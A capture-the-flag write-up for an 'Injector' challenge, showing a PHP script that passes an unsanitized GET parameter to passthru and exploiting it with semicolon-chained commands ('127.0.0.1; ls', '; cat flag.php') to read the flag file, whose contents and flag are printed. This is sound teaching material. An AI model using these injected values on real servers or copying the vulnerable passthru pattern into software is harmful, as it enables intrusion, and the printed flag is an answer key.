# Injector (500 points)

This write-up details a Command Injection vulnerability discovered in a web application. The vulnerability was identified in a PHP script that improperly handles user input, allowing an attacker to execute arbitrary commands on the server.

# Vulnerable Component:

The vulnerability exists in a PHP script that utilizes the passthru function to execute a ping command with user-supplied input. The script concatenates a parameter obtained from a GET request ($_GET['host']) directly into the command line:

```
passthru("ping -c 2 " . $_GET['host']);
```
# Exploit Description:

The vulnerability was exploited by appending a semicolon (;) followed by an arbitrary command to the host parameter in the GET request. In Unix-like operating systems, the semicolon is used to separate commands, allowing multiple commands to be executed in sequence.

# Exploitation Steps:

# Initial Command Execution Test:

The following URL was used to test the execution of additional commands:
```
http://<server>/index.php?host=127.0.0.1; ls
```
This resulted in the execution of the ls command, listing files in the current directory (flag.php, index.php).

# Reading File Contents:

To read the contents of flag.php, the following URL was used:
```
http://<server>/index.php?host=127.0.0.1; cat flag.php
```
This command displayed the contents of flag.php.

# now look at the html source file
```
<pre><?php


//CTF{C0mm4nd_1nj3c5i0n_1s_E4sy}


?>
</pre><pre style="color:red;">Command executed: ping -c 2 127.0.0.1; cat flag.php</pre>
```
**FLAG:** `CTF{C0mm4nd_1nj3c5i0n_1s_E4sy}`